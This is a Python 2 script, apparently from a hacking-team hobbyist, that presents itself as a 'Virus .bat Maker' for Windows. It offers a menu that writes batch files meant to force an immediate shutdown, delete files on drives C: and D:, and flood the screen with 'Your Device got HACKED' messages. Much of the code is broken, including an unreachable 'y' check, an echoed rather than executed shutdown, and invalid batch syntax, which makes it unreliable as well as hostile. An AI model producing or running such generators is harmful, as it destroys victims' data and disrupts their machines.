#!/usr/bin/python

############################### TOOLS MAKED BY G3D1T
import os
import urllib2
import json
import time
import smtplib
from termcolor import colored, cprint
from base64 import *
############################### RECODE AUTO JAHANNAM

os.system("reset")

print ("\033[93m  ____  ____  _____     ___  _____ _____   _____ _   _    _    _   _")
print ("\033[93m |  _ \|  _ \|_ _\ \   / / \|_   _| ____| |_   _| | | |  / \  | \ | |")
print ("\033[93m | |_) | |_) || | \ \ / / _ \ | | |  _|     | | | |_| | / _ \ |  \| |")
print ("\033[93m |  __/|  _ < | |  \ V / ___ \| | | |___    | | |  _  |/ ___ \| |\  |")
print ("\033[93m |_|   |_| \_\___|  \_/_/   \_\_| |_____|   |_| |_| |_/_/   \_\_| \_|")
print ("\033[93m ========================================")
print ("\033[34m [+] TOOLS : Virus .bat Maker for OS Windows")
print ("\033[34m [+] Author : Nathan")
print ("\033[95m [-] Found bug / crash ? contact my instagram at @nathandeft")
print ("\033[34m [+] My Team = Anon Cyber Team | Security Darknet")
print ("\033[34m [+] Thanks to : My Team, CodayID, and All My Friend")
text = colored('Hargai Creator / Author Tools dengan tidak me RECODE tools ini' , 'cyan', attrs=['reverse', 'blink'])
print (text)
print ("\033[93m ========================================")

def menu():
    print'\33[33m Choose The Selection :'
    print'\33[33m -----------------'
    print'\33[33m [1] Shutdown'
    print'\33[33m [2] Delete all Files Target'
    print'\33[33m [3] Summon Text Permanently'
    print'\33[33m [4] Exit'
    print'\33[33m -----------------'
def shutdown():
    thangans = open ("shutdown.bat","w")
    virus = """
    @echo shutdown -s -t 1 -f 
    """
    thangans.write(virus)
    thangans.close
    print 'Want Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()
def delete():
    thangans = open ("delete.bat","w")
    virus = """
    @echo off
    DEL C: -Y
    DEL D: -Y
    """
    thangans.write(virus)
    thangans.close
    print 'Want Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()
def summon():
    thangans = open ("summon.bat","w")
    virus = """
    @echo off
    :Begin
    msg * Your Device got HACKED
    msg * Your Device was infected by THAN MALWARE
    msg * Re - Install your Device
    go to begin
    """
    thangans.write(virus)
    thangans.close
    print 'Want Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()
menu()
while 1:
    pilih=input('Input Your Selection : ')
    if pilih==1:
        shutdown()
    elif pilih==2:
        delete()
    elif pilih==3:
        summon()
    elif pilih==4 :
        exit()
    else:
        print'maaf pilihan anda tidak ada dimenu'
	print'sorry, your selection not available on menu'
        print'Want Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()
